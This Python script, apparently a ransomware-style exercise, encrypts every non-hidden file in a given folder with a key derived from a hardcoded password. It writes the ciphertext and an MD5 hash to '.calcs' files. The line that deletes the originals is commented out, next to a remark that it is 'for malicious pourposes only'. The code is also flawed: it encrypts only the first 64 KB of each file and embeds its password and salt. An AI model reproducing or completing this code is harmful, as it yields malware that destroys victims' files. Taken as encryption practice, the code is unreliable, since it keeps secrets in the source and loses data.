# File Encryptor 

# Imports 
import os
import sys
import hashlib
import base64
import json 
# Cryptography imports 
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Declerations and intialization 
BUF_SIZE = 65536  # lets read stuff in 64kb chunks!

# Start of self defined functions 
def get_file_list(folder_path):
    # returns a list of all directory files
    return os.listdir()

def get_file_data(file_path): # Changed from file_list
    # Reading data in binary mode 
    with open(file_path, 'rb') as f:
        # f.seek(0)
        data = f.read(BUF_SIZE)
        if not data:
            pass        # fix with an a validation and exit condition 
    return data

def get_file_hash(data):
    # Hashing the byte data with md5 hash 
    md5 = hashlib.md5(data)
    md5 = md5.hexdigest()
    return md5            

def encrypt_data_and_b64(data):
    # Encryption
    # Hardcoded passowrd and salt generated with urandom(16)
    password = b"pa$$w0rd"
    salt = b"\xda\xc2\xa6\x86\xec\x94/u\xab\xf3A{\xb7\n\rd"
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=480000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)
    encrypted=f.encrypt(data)
    
    # Base64 encoding of encrypted data
    b64 = base64.b64encode(encrypted)
    b64 = b64.decode('utf-8')
    return b64

def json_dump_to_file(file_path,hash_b64_dict):
    # Adding '.calcs' suffix 
    json_filename = file_path+(r".calcs")
    #writing data to jsaon
    with open(json_filename, 'w', encoding='utf-8') as f:  
        json.dump(hash_b64_dict, f, ensure_ascii=False, indent=4)

def remove_files(file_path):
    os.remove(file_path)

# Start of main 
def main():

    # Accepting the folder's path as the first argument,     
    try:
        # argc represents the argument count - script name and file path 
        argc = len(sys.argv)
        if (argc !=2 ):
            print("Usage: encryptFile.py [DIR_PATH]")
            sys.exit(1)
        
        folder_path = sys.argv[1]
               
        os.chdir(folder_path)

    except FileNotFoundError:
        print(f"Error: Direcory '{folder_path}' not found.")
        sys.exit(1)

    except NotADirectoryError:
        print(f"Error: '{folder_path}' is not a directory.")
        sys.exit(1)

    except PermissionError:
        print(f"Error: Permission denied when accessing '{folder_path}'.")
        sys.exit(1)

    # Generating a list of files from the directory path provided by the user 
    file_list = get_file_list(folder_path)
    
    for file_path in file_list:
        # Avoiding directories
        if (os.path.isdir(file_path)):
            continue
        # Condition to avoid multiple iternations on the same file 
        if file_path.endswith(".calcs"): 
            continue
        # Avodiing linux hidden files
        if file_path.startswith("."):
            continue
        else:
            fileData = get_file_data(file_path)
            md5 = get_file_hash(fileData)
            b64 = encrypt_data_and_b64(fileData)
            # Dictonary to contain 'filehash:' and 'filecontents:' values
            hash_b64_dict = {'filehash:':md5, 'filecontents:':b64}
            # Dumping the dictoinary data to json 
            json_dump_to_file(file_path, hash_b64_dict)  
            # Deletes the encrypted files,for malicious pourposes only,
            # remove_files(file_path)   # comment out for saftey 

# Calling main function 
if __name__=='__main__':
    main()
